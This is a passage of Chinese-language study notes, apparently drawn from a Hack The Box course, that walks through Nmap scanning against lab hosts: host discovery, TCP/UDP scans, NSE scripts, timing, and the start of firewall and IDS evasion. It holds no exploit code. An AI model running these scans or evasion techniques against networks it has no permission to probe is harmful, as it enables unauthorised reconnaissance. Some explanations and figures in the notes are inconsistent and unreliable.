id="Scan-IP-List"><a href="#Scan-IP-List" class="headerlink" title="Scan IP List"></a>Scan IP List</h2><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d&quot; &quot; -f5</code></pre><table><thead><tr><th><code>-iL</code></th><th>Performs defined scans against targets in provided ‘hosts.lst’ list.</th></tr></thead><tbody><tr><td><code>-sn</code></td><td>Disables port scanning.</td></tr></tbody></table><h2 id="Scan-Multiple-IPs"><a href="#Scan-Multiple-IPs" class="headerlink" title="Scan Multiple IPs"></a>Scan Multiple IPs</h2><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d&quot; &quot; -f5</code></pre><p>如果这些IP地址相邻，我们也可以定义各自八位字节中的范围。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d&quot; &quot; -f5</code></pre><p>如果我们禁用端口扫描（-sn），Nmap会使用ICMP回显请求（-PE）自动ping扫描。一旦发送了这样的请求，如果ping主机处于活动状态，我们通常会收到ICMP回复。更有趣的事实是，我们之前的扫描并没有做到这一点，因为在Nmap发送ICMP回显请求之前，它会发送ARP ping，从而得到ARP回复。我们可以通过“–packet trace”选项来确认这一点。为了确保发送ICMP回显请求，我们还为此定义了选项（-PE）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CESTSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EFNmap scan report for 10.129.2.18Host is up (0.023s latency).MAC Address: DE:AD:00:00:BE:EFNmap done: 1 IP address (1 host up) scanned in 0.05 seconds</code></pre><table><thead><tr><th><code>-PE</code></th><th>Performs the ping scan by using ‘ICMP Echo requests’ against the target.</th></tr></thead><tbody><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received</td></tr></tbody></table><p>另一种确定Nmap为什么将我们的目标标记为“alive”的方法是使用“–reason”选项。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:10 CESTSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EFNmap scan report for 10.129.2.18Host is up, received arp-response (0.028s latency).MAC Address: DE:AD:00:00:BE:EFNmap done: 1 IP address (1 host up) scanned in 0.03 seconds</code></pre><p>我们在这里看到，Nmap确实通过ARP请求和ARP回复单独检测主机是否活着。要禁用ARP请求并用所需的ICMP回显请求扫描我们的目标，我们可以通过设置“–disable ARP ping”选项来禁用ARP ping。然后我们可以再次扫描目标，查看发送和接收的数据包。</p><p>ICMP回显请求可以帮助我们确定目标是否活着并识别其系统。有关主机发现的更多策略，请访问：<a href="https://nmap.org/book/host-discovery-strategies.html">https://nmap.org/book/host-discovery-strategies.html</a></p><blockquote><p>​不同操作系统的ICMP Time-to-Live (TTL)值可能会有所不同。TTL是一个IP数据包头部字段，它指定了数据包在网络中可以经过的最大路由跳数。当ICMP Echo Request（ping请求）被发送到目标主机时，TTL字段被设置为一个初始值，然后在每个路由器经过时递减。通过检查返回的ICMP Echo Reply（ping响应）中的TTL值，可以提供一些关于目标主机的操作系统类型的线索。</p><p>然而，需要注意的是，TTL值并非仅由操作系统决定，还受到网络设备、路由器和防火墙等因素的影响。因此，通过TTL值进行操作系统识别是一种推测，可能并不总是准确。</p><p>以下是一些常见操作系统的TTL默认值范例：</p><ul><li>Windows系统通常使用默认TTL值为 128。</li><li>Linux和Unix系统通常使用默认TTL值为 64。</li><li>macOS系统通常使用默认TTL值为 64。</li></ul></blockquote><h1 id="Host-and-Port-Scanning"><a href="#Host-and-Port-Scanning" class="headerlink" title="Host and Port Scanning"></a>Host and Port Scanning</h1><h2 id="Discovering-Open-TCP-Ports"><a href="#Discovering-Open-TCP-Ports" class="headerlink" title="Discovering Open TCP Ports"></a>Discovering Open TCP Ports</h2><p>默认情况下，Nmap使用SYN扫描（-sS）扫描前1000个TCP端口。由于创建原始TCP数据包所需的套接字权限，此SYN扫描仅在我们以root身份运行时设置为默认值。否则，默认情况下会执行TCP扫描（-sT）。这意味着，如果我们不定义端口和扫描方法，这些参数将自动设置。我们可以逐个定义端口（-p 22，25，80139445），按范围（-p 22-445），按Nmap数据库中已被签名为最频繁的顶级端口（-top ports&#x3D;10），通过扫描所有端口（-p-），也可以定义包含前100个端口（-F）的快速端口扫描。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 --top-ports=10 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:36 CESTNmap scan report for 10.129.2.28Host is up (0.021s latency).PORT     STATE    SERVICE21/tcp   closed   ftp22/tcp   open     ssh23/tcp   closed   telnet25/tcp   open     smtp80/tcp   open     http110/tcp  open     pop3139/tcp  filtered netbios-ssn443/tcp  closed   https445/tcp  filtered microsoft-ds3389/tcp closed   ms-wbt-serverMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds</code></pre><p>我们看到，我们只扫描了目标的前10个TCP端口，Nmap相应地显示了它们的状态。如果我们跟踪Nmap发送的数据包，我们将看到目标发送回我们的TCP端口21上的RST标志。为了清楚地了解SYN扫描，我们禁用ICMP回显请求（-Pn）、DNS解析（-n）和ARP ping扫描（–disable ARP ping）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-pingStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:39 CESTSENT (0.0429s) TCP 10.10.14.2:63090 &gt; 10.129.2.28:21 S ttl=56 id=57322 iplen=44  seq=1699105818 win=1024 &lt;mss 1460&gt;RCVD (0.0573s) TCP 10.129.2.28:21 &gt; 10.10.14.2:63090 RA ttl=64 id=0 iplen=40  seq=0 win=0Nmap scan report for 10.11.1.28Host is up (0.014s latency).PORT   STATE  SERVICE21/tcp closed ftpMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds</code></pre><p>我们可以从SENT行中看到，我们（10.10.14.2）向我们的目标（10.129.2.28）发送了一个带有SYN标志（S）的TCP数据包。在下一行RCVD中，我们可以看到目标用一个包含RST和ACK标志（RA）的TCP包进行响应。RST和ACK标志用于确认TCP分组（ACK）的接收并结束TCP会话（RST）。</p><table><thead><tr><th><code>--packet-trace</code></th><th>Shows all packets sent and received.</th></tr></thead><tbody><tr><td><code>-n</code></td><td>Disables DNS resolution.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP ping.</td></tr></tbody></table><h4 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h4><table><thead><tr><th><strong>Message</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>RCVD (0.0573s)</code></td><td>Indicates a received packet from the target.</td></tr><tr><td><code>TCP</code></td><td>Shows the protocol that is being used.</td></tr><tr><td><code>10.129.2.28:21 &gt;</code></td><td>Represents targets IPv4 address and the source port, which will be used to reply.</td></tr><tr><td><code>10.10.14.2:63090</code></td><td>Shows our IPv4 address and the port that will be replied to.</td></tr><tr><td><code>RA</code></td><td>RST and ACK flags of the sent TCP packet.</td></tr><tr><td><code>ttl=64 id=0 iplen=40 seq=0 win=0</code></td><td>Additional TCP Header parameters.</td></tr></tbody></table><h4 id="Connect-Scan"><a href="#Connect-Scan" class="headerlink" title="Connect Scan"></a>Connect Scan</h4><p>Nmap TCP连接扫描 <a href="https://nmap.org/book/scan-methods-connect-scan.html">TCP Connect Scan</a>（-sT）使用TCP三方握手来确定目标主机上的特定端口是打开还是关闭。扫描会向目标端口发送一个SYN数据包，并等待响应。如果目标端口用SYN-ACK数据包进行响应，则它被认为是打开的；如果目标端口使用RST数据包进行回应，则它是关闭的。 Connect扫描很有用，因为它是确定端口状态的最准确方法，也是最隐蔽的方法。与其他类型的扫描（如SYN扫描）不同，Connect扫描不会在目标主机上留下任何未完成的连接或未发送的数据包，这使得它不太可能被入侵检测系统（IDS）或入侵预防系统（IPS）检测到。当我们想绘制网络地图，又不想干扰其背后运行的服务时，它很有用，因此影响最小，有时被认为是一种更礼貌的扫描方法。 当目标主机具有丢弃传入数据包但允许传出数据包的个人防火墙时，它也很有用。在这种情况下，连接扫描可以绕过防火墙，准确地确定目标端口的状态。但是，需要注意的是，Connect扫描比其他类型的扫描慢，因为它要求扫描仪在发送每个数据包后等待来自目标的响应，如果目标繁忙或没有响应，这可能需要一些时间。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:26 CETCONN (0.0385s) TCP localhost &gt; 10.129.2.28:443 =&gt; Operation now in progressCONN (0.0396s) TCP localhost &gt; 10.129.2.28:443 =&gt; ConnectedNmap scan report for 10.129.2.28Host is up, received user-set (0.013s latency).PORT    STATE SERVICE REASON443/tcp open  https   syn-ackNmap done: 1 IP address (1 host up) scanned in 0.04 seconds</code></pre><h2 id="Filtered-Ports"><a href="#Filtered-Ports" class="headerlink" title="Filtered Ports"></a>Filtered Ports</h2><p>当一个端口显示为已过滤时，可能有几个原因。在大多数情况下，防火墙都设置了某些规则来处理特定的连接。数据包可以被丢弃，也可以被拒绝。当数据包被丢弃时，Nmap不会收到来自目标的响应，默认情况下，重试率（–max retries）设置为1。这意味着Nmap将向目标端口重新发送请求，以确定前一个数据包是否未被意外错误处理。 让我们看一个例子，其中防火墙丢弃了我们为端口扫描发送的TCP数据包。因此，我们扫描TCP端口139，该端口已显示为已过滤。为了能够跟踪我们发送的数据包是如何处理的，我们再次停用ICMP回显请求（-Pn）、DNS解析（-n）和ARP ping扫描（–disable ARP-ping）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -PnStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:45 CESTSENT (0.0381s) TCP 10.10.14.2:60277 &gt; 10.129.2.28:139 S ttl=47 id=14523 iplen=44  seq=4175236769 win=1024 &lt;mss 1460&gt;SENT (1.0411s) TCP 10.10.14.2:60278 &gt; 10.129.2.28:139 S ttl=45 id=7372 iplen=44  seq=4175171232 win=1024 &lt;mss 1460&gt;Nmap scan report for 10.129.2.28Host is up.PORT    STATE    SERVICE139/tcp filtered netbios-ssnMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds</code></pre><p>我们在上一次扫描中看到，Nmap发送了两个带有SYN标志的TCP数据包。通过扫描的持续时间（2.06s），我们可以识别出它比以前的扫描花费了更长的时间（~0.05s）。如果防火墙拒绝数据包，情况就不同了。为此，我们看一下TCP端口445，它由防火墙的这种规则相应地处理。</p><p>​       </p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 445 --packet-trace -n --disable-arp-ping -PnStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:55 CESTSENT (0.0388s) TCP 10.129.2.28:52472 &gt; 10.129.2.28:445 S ttl=49 id=21763 iplen=44  seq=1418633433 win=1024 &lt;mss 1460&gt;RCVD (0.0487s) ICMP [10.129.2.28 &gt; 10.129.2.28 Port 445 unreachable (type=3/code=3) ] IP [ttl=64 id=20998 iplen=72 ]Nmap scan report for 10.129.2.28Host is up (0.0099s latency).PORT    STATE    SERVICE445/tcp filtered microsoft-dsMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds</code></pre><p>作为响应，我们收到一个ICMP回复，类型为3，错误代码为3，表示无法访问所需的主机。尽管如此，如果我们知道主机是活动的，我们可以强烈假设该端口上的防火墙正在拒绝数据包，稍后我们将不得不仔细查看该端口。</p><h2 id="Discovering-Open-UDP-Ports"><a href="#Discovering-Open-UDP-Ports" class="headerlink" title="Discovering Open UDP Ports"></a>Discovering Open UDP Ports</h2><p>有些系统管理员有时除了过滤TCP端口外，还忘记过滤UDP端口。由于UDP是一种无状态协议，不需要像TCP那样的三方握手。我们没有收到任何确认。因此，超时时间要长得多，使得整个UDP扫描（-sU）比TCP扫描（-sS）慢得多。 让我们来看看UDP扫描（-sU）的样子以及它给我们带来的结果。</p><h4 id="UDP-Port-Scan"><a href="#UDP-Port-Scan" class="headerlink" title="UDP Port Scan"></a>UDP Port Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -F -sUStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:01 CESTNmap scan report for 10.129.2.28Host is up (0.059s latency).Not shown: 95 closed portsPORT     STATE         SERVICE68/udp   open|filtered dhcpc137/udp  open          netbios-ns138/udp  open|filtered netbios-dgm631/udp  open|filtered ipp5353/udp open          zeroconfMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 98.07 seconds</code></pre><table><thead><tr><th><strong>Scanning Options</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>-F</code></td><td>Scans top 100 ports.</td></tr><tr><td><code>-sU</code></td><td>Performs a UDP scan.</td></tr></tbody></table><p>这样做的另一个缺点是，我们经常得不到响应，因为Nmap向扫描的UDP端口发送空数据报，而我们没有收到任何响应。因此，我们无法确定UDP数据包是否已经到达。如果UDP端口是打开的，我们只有在应用程序被配置为打开时才会得到响应。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 137 --reason Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:15 CESTSENT (0.0367s) UDP 10.10.14.2:55478 &gt; 10.129.2.28:137 ttl=57 id=9122 iplen=78RCVD (0.0398s) UDP 10.129.2.28:137 &gt; 10.10.14.2:55478 ttl=64 id=13222 iplen=257Nmap scan report for 10.129.2.28Host is up, received user-set (0.0031s latency).PORT    STATE SERVICE    REASON137/udp open  netbios-ns udp-response ttl 64MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds</code></pre><p>如果我们得到错误代码为3（无法访问端口）的ICMP响应，我们就知道该端口确实已关闭。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 100 --reason Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:25 CESTSENT (0.0445s) UDP 10.10.14.2:63825 &gt; 10.129.2.28:100 ttl=57 id=29925 iplen=28RCVD (0.1498s) ICMP [10.129.2.28 &gt; 10.10.14.2 Port unreachable (type=3/code=3) ] IP [ttl=64 id=11903 iplen=56 ]Nmap scan report for 10.129.2.28Host is up, received user-set (0.11s latency).PORT    STATE  SERVICE REASON100/udp closed unknown port-unreach ttl 64MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in  0.15 seconds</code></pre><p>另一种方便的扫描端口的方法是-sV选项，用于从打开的端口获取额外的可用信息。这种方法可以识别版本、服务名称和有关我们目标的详细信息。</p><p>More information about port scanning techniques we can find at: <a href="https://nmap.org/book/man-port-scanning-techniques.html">https://nmap.org/book/man-port-scanning-techniques.html</a></p><h1 id="Saving-the-Results"><a href="#Saving-the-Results" class="headerlink" title="Saving the Results"></a>Saving the Results</h1><h2 id="Different-Formats"><a href="#Different-Formats" class="headerlink" title="Different Formats"></a>Different Formats</h2><p>当我们运行各种扫描时，我们应该始终保存结果。我们可以稍后使用这些来检查我们使用的不同扫描方法之间的差异。Nmap可以将结果保存为3种不同的格式。 </p><p>具有.nmap文件扩展名的正常输出（-oN） </p><p>具有.gnmap文件扩展名的可扩展输出（-oG） </p><p>扩展名为.XML的XML输出（-oX）</p><h2 id="Style-sheets"><a href="#Style-sheets" class="headerlink" title="Style sheets"></a>Style sheets</h2><p>有了XML输出，我们可以轻松地创建易于阅读的HTML报告，即使对于非技术人员来说也是如此。这在以后的文档中非常有用，因为它以详细而清晰的方式呈现了我们的结果。要将存储的结果从XML格式转换为HTML，我们可以使用xsltproc工具。</p><pre><code class="shell-session">Tanin@htb[/htb]$ xsltproc target.xml -o target.html</code></pre><p>More information about the output formats can be found at: <a href="https://nmap.org/book/output.html">https://nmap.org/book/output.html</a></p><h1 id="Service-Enumeration"><a href="#Service-Enumeration" class="headerlink" title="Service Enumeration"></a>Service Enumeration</h1><p>首先，Nmap会查看扫描端口的横幅并将其打印出来。如果无法通过横幅识别版本，Nmap会尝试通过基于签名的匹配系统识别版本，但这会显著增加扫描的持续时间。Nmap给出的结果的一个缺点是，自动扫描可能会错过一些信息，因为有时Nmap不知道如何处理这些信息。</p><p>在成功的三方握手之后，服务器通常会发送一条横幅进行标识。这是为了让客户端知道它正在使用哪个服务。在网络级别，这种情况发生在TCP报头中的PSH标志上。然而，某些服务可能不会立即提供此类信息。还可以从相应的服务中移除或操纵横幅。如果我们使用nc手动连接到SMTP服务器，获取横幅，并使用tcpdump拦截网络流量，我们可以看到Nmap没有向我们显示的内容</p><h4 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes</code></pre><h4 id="Nc"><a href="#Nc" class="headerlink" title="Nc"></a>Nc</h4><pre><code class="shell-session">Tanin@htb[/htb]$  nc -nv 10.129.2.28 25Connection to 10.129.2.28 port 25 [tcp/*] succeeded!220 inlane ESMTP Postfix (Ubuntu)</code></pre><h1 id="Nmap-Scripting-Engine"><a href="#Nmap-Scripting-Engine" class="headerlink" title="Nmap Scripting Engine"></a>Nmap Scripting Engine</h1><p>Nmap脚本引擎（NSE）是Nmap的另一个方便功能。它为我们提供了在Lua中创建用于与某些服务交互的脚本的可能性。这些脚本总共可分为14类：</p><table><thead><tr><th><strong>类别</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>auth</code></td><td>确定身份验证凭据。</td></tr><tr><td><code>broadcast</code></td><td>通过广播和发现的主机用于主机发现的脚本可以自动添加到其余扫描中。</td></tr><tr><td><code>brute</code></td><td>执行尝试通过使用凭据暴力破解登录到相应服务的脚本。</td></tr><tr><td><code>default</code></td><td>使用该选项执行的默认脚本。<code>-sC</code></td></tr><tr><td><code>discovery</code></td><td>无障碍服务评估。</td></tr><tr><td><code>dos</code></td><td>这些脚本用于检查服务是否存在拒绝服务漏洞，并且使用较少，因为它会损害服务。</td></tr><tr><td><code>exploit</code></td><td>此类脚本尝试利用扫描端口的已知漏洞。</td></tr><tr><td><code>external</code></td><td>使用外部服务进行进一步处理的脚本。</td></tr><tr><td><code>fuzzer</code></td><td>这使用脚本通过发送不同的字段来识别漏洞和意外的数据包处理，这可能需要很长时间。</td></tr><tr><td><code>intrusive</code></td><td>可能对目标系统产生负面影响的侵入性脚本。</td></tr><tr><td><code>malware</code></td><td>检查某些恶意软件是否感染了目标系统。</td></tr><tr><td><code>safe</code></td><td>不执行侵入性和破坏性访问的防御性脚本。</td></tr><tr><td><code>version</code></td><td>服务检测的扩展。</td></tr><tr><td><code>vuln</code></td><td>识别特定漏洞。</td></tr></tbody></table><h4 id="Default-Scripts"><a href="#Default-Scripts" class="headerlink" title="Default Scripts"></a>Default Scripts</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap &lt;target&gt; -sC</code></pre><h4 id="Specific-Scripts-Category"><a href="#Specific-Scripts-Category" class="headerlink" title="Specific Scripts Category"></a>Specific Scripts Category</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap &lt;target&gt; --script &lt;category&gt;</code></pre><h4 id="Defined-Scripts"><a href="#Defined-Scripts" class="headerlink" title="Defined Scripts"></a>Defined Scripts</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap &lt;target&gt; --script &lt;script-name&gt;,&lt;script-name&gt;,...</code></pre><p>例如，让我们继续使用目标SMTP端口，并查看使用两个定义的脚本得到的结果。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commandsStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 23:21 CESTNmap scan report for 10.129.2.28Host is up (0.050s latency).PORT   STATE SERVICE25/tcp open  smtp|_banner: 220 inlane ESMTP Postfix (Ubuntu)|_smtp-commands: inlane, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)</code></pre><table><thead><tr><th><code>-A</code></th><th>Performs service detection, OS detection, traceroute and uses defaults scripts to scan the target.</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><h1 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h1><p>当我们需要扫描广泛的网络或处理低网络带宽时，扫描性能起着重要作用。我们可以使用各种选项来告诉Nmap测试数据包的速度（-T＜1-5&gt;）、频率（–min parallelism＜number＞）、超时（–max rtt timeout＜time＞）、同时发送的数据包数量（–min rate＜number＞)。</p><h2 id="Timeouts"><a href="#Timeouts" class="headerlink" title="Timeouts"></a>Timeouts</h2><p>当Nmap发送数据包时，从扫描端口接收响应需要一些时间（往返时间-RTT）。通常，Nmap以100ms的高超时（–min RTT超时）开始。让我们看一个例子，通过扫描具有256个主机的整个网络，包括前100个端口。</p><h4 id="Default-Scan"><a href="#Default-Scan" class="headerlink" title="Default Scan"></a>Default Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F&lt;SNIP&gt;Nmap done: 256 IP addresses (10 hosts up) scanned in 39.44 seconds</code></pre><h4 id="Optimized-RTT"><a href="#Optimized-RTT" class="headerlink" title="Optimized RTT"></a>Optimized RTT</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms&lt;SNIP&gt;Nmap done: 256 IP addresses (8 hosts up) scanned in 12.29 seconds</code></pre><table><thead><tr><th><strong>Scanning Options</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>-F</code></td><td>Scans top 100 ports.</td></tr><tr><td><code>--initial-rtt-timeout 50ms</code></td><td>Sets the specified time value as initial RTT timeout.</td></tr><tr><td><code>--max-rtt-timeout 100ms</code></td><td>Sets the specified time value as maximum RTT timeout.</td></tr></tbody></table><p>当比较两次扫描时，我们可以看到，我们发现优化扫描减少了两台主机，但扫描只花了四分之一的时间。由此，我们可以得出结论，将初始RTT超时（–initial RTT timeout）设置为太短的时间段可能会导致我们忽略主机。</p><h2 id="Max-Retries"><a href="#Max-Retries" class="headerlink" title="Max Retries"></a>Max Retries</h2><p>另一种提高扫描速度的方法是指定发送数据包的重试率（–max retries）。重试率的默认值是10，因此，如果Nmap没有收到端口的响应，它将不会向该端口发送更多的数据包，并且将被跳过。</p><h4 id="Default-Scan-1"><a href="#Default-Scan-1" class="headerlink" title="Default Scan"></a>Default Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F | grep &quot;/tcp&quot; | wc -l23</code></pre><h4 id="Reduced-Retries"><a href="#Reduced-Retries" class="headerlink" title="Reduced Retries"></a>Reduced Retries</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --max-retries 0 | grep &quot;/tcp&quot; | wc -l21</code></pre><p>我们再次认识到，加速也会对我们的结果产生负面影响，这意味着我们可能忽视重要信息。</p><h2 id="Rates"><a href="#Rates" class="headerlink" title="Rates"></a>Rates</h2><p>在白盒渗透测试期间，我们可能会将安全系统列入白名单，以检查网络中的系统是否存在漏洞，而不仅仅是测试保护措施。如果我们知道网络带宽，我们就可以处理发送的数据包的速率，这大大加快了我们使用Nmap的扫描速度。当设置发送数据包的最小速率（–min-rate＜number＞）时，我们告诉Nmap同时发送指定数量的数据包。它将尝试相应地保持利率。</p><h4 id="Default-Scan-2"><a href="#Default-Scan-2" class="headerlink" title="Default Scan"></a>Default Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.default&lt;SNIP&gt;Nmap done: 256 IP addresses (10 hosts up) scanned in 29.83 seconds</code></pre><h4 id="Optimized-Scan"><a href="#Optimized-Scan" class="headerlink" title="Optimized Scan"></a>Optimized Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300&lt;SNIP&gt;Nmap done: 256 IP addresses (10 hosts up) scanned in 8.67 seconds</code></pre><table><thead><tr><th><code>--min-rate 300</code></th><th>Sets the minimum number of packets to be sent per second.</th></tr></thead></table><h2 id="Timing"><a href="#Timing" class="headerlink" title="Timing"></a>Timing</h2><p>因为这样的设置不能总是手动优化，比如在黑匣子渗透测试中，Nmap提供了六种不同的计时模板（-T＜0-5＞）供我们使用。这些值（0-5）决定了我们扫描的攻击性。如果扫描过于激进，这也会产生负面影响，安全系统可能会因产生的网络流量而阻止我们。当我们没有定义其他内容时，使用的默认计时模板是正常的（-T3）。</p><ul><li><code>-T 0</code> &#x2F; <code>-T paranoid</code></li><li><code>-T 1</code> &#x2F; <code>-T sneaky</code></li><li><code>-T 2</code> &#x2F; <code>-T polite</code></li><li><code>-T 3</code> &#x2F; <code>-T normal</code></li><li><code>-T 4</code> &#x2F; <code>-T aggressive</code></li><li><code>-T 5</code> &#x2F; <code>-T insane</code></li></ul><p>这些模板包含我们也可以手动设置的选项，我们已经看到了其中的一些。开发人员根据他们的最佳结果确定了这些模板的值集，使我们更容易将扫描适应相应的网络环境。我们可以在这里找到确切使用的选项及其值：</p><p><a href="https://nmap.org/book/performance-timing-templates.html">https://nmap.org/book/performance-timing-templates.html</a></p><h1 id="Firewall-and-IDS-x2F-IPS-Evasion"><a href="#Firewall-and-IDS-x2F-IPS-Evasion" class="headerlink" title="Firewall and IDS&#x2F;IPS Evasion"></a>Firewall and IDS&#x2F;IPS Evasion</h1><p>Nmap为我们提供了许多不同的方法来绕过防火墙规则和IDS&#x2F;IPS。这些方法包括数据包的分段、诱饵的使用以及我们将在本节中讨论的其他方法。</p><h2 id="Firewalls"><a href="#Firewalls" class="headerlink" title="Firewalls"></a>Firewalls</h2><p>防火墙是防止来自外部网络的未经授权的连接尝试的安全措施。每个防火墙安全系统都基于一个软件组件，该组件监控防火墙和传入数据连接之间的网络流量，并根据已设置的规则决定如何处理连接。它检查单个网络数据包是否被传递、忽略或阻止。此机制旨在防止可能存在潜在危险的不必要连接。</p><h2 id="IDS-x2F-IPS"><a href="#IDS-x2F-IPS" class="headerlink" title="IDS&#x2F;IPS"></a>IDS&#x2F;IPS</h2><p>与防火墙一样，入侵检测系统（IDS）和入侵防御系统（IPS）也是基于软件的组件。IDS扫描网络以寻找潜在的攻击，对其进行分析，并报告任何检测到的攻击。IPS通过在本应检测到潜在攻击的情况下采取特定防御措施来补充IDS。对此类攻击的分析基于模式匹配和签名。如果检测到特定模式，例如服务检测扫描，IPS可以阻止挂起的连接尝试。</p><h4 id="Determine-Firewalls-and-Their-Rules"><a href="#Determine-Firewalls-and-Their-Rules" class="headerlink" title="Determine Firewalls and Their Rules"></a>Determine Firewalls and Their Rules</h4><p>我们已经知道，当一个端口显示为已筛选时，可能有几个原因。在大多数情况下，防火墙都设置了某些规则来处理特定的连接。数据包可以被丢弃，也可以被拒绝。丢弃的数据包将被忽略，主机不会返回任何响应。 这与用RST标志返回的被拒绝的数据包不同。这些数据包包含不同类型的ICMP错误代码，或者根本不包含任何内容。 此类错误可能是：</p><ul><li>无法访问网络</li><li>禁用网络 </li><li>主机不可达 </li><li>禁止主机 </li><li>端口不可达 </li><li>无法访问协议</li></ul><p>与常规的SYN（-sS）或Connect扫描（sT）相比，Nmap的TCP ACK扫描（-sA）方法更难过滤防火墙和IDS&#x2F;IPS系统，因为它们只发送带有ACK标志的TCP数据包。当端口关闭或打开时，主机必须使用RST标志进行响应。与传出连接不同，来自外部网络的所有连接尝试（带有SYN标志）通常都会被防火墙阻止。然而，带有ACK标志的数据包通常由防火墙传递，因为防火墙无法确定连接是首先从外部网络还是从内部网络建立的。 如果我们看一下这些扫描，我们会发现结果有什么不同。</p><h4 id="SYN-Scan"><a href="#SYN-Scan" class="headerlink" title="SYN-Scan"></a>SYN-Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-traceStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:56 CESTSENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:22 S ttl=53 id=22412 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;SENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:25 S ttl=50 id=62291 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;SENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:21 S ttl=58 id=38696 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;RCVD (0.0329s) ICMP 